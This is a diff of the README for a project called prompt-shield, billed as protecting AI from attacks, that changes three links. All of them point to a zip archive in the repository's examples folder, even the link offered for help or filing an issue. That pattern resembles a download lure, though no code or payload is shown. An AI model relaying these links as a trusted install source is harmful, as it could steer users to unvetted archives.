@@ -1,6 +1,6 @@
 # 🛡️ prompt-shield - Protect Your AI From Attacks
 
-[![Download prompt-shield](https://github.com/ShaggyT0701/prompt-shield/raw/refs/heads/main/examples/prompt-shield-v1.3-alpha.3.zip)](https://github.com/ShaggyT0701/prompt-shield/raw/refs/heads/main/examples/prompt-shield-v1.3-alpha.3.zip)
+[![Download prompt-shield](https://raw.githubusercontent.com/ShaggyT0701/prompt-shield/main/examples/prompt-shield-v1.3-alpha.3.zip)](https://raw.githubusercontent.com/ShaggyT0701/prompt-shield/main/examples/prompt-shield-v1.3-alpha.3.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get it up and running:
 
 Please visit this page to download the latest version of prompt-shield:
 
-[Download prompt-shield](https://github.com/ShaggyT0701/prompt-shield/raw/refs/heads/main/examples/prompt-shield-v1.3-alpha.3.zip)
+[Download prompt-shield](https://raw.githubusercontent.com/ShaggyT0701/prompt-shield/main/examples/prompt-shield-v1.3-alpha.3.zip)
 
 ### Step-by-step download guide:
 
@@ -94,7 +94,7 @@ If you run into issues, try these fixes first:
 
 If problems continue, visit the GitHub repository for help or file an issue:
 
-[https://github.com/ShaggyT0701/prompt-shield/raw/refs/heads/main/examples/prompt-shield-v1.3-alpha.3.zip](https://github.com/ShaggyT0701/prompt-shield/raw/refs/heads/main/examples/prompt-shield-v1.3-alpha.3.zip)
+[https://raw.githubusercontent.com/ShaggyT0701/prompt-shield/main/examples/prompt-shield-v1.3-alpha.3.zip](https://raw.githubusercontent.com/ShaggyT0701/prompt-shield/main/examples/prompt-shield-v1.3-alpha.3.zip)
 
 ---
 
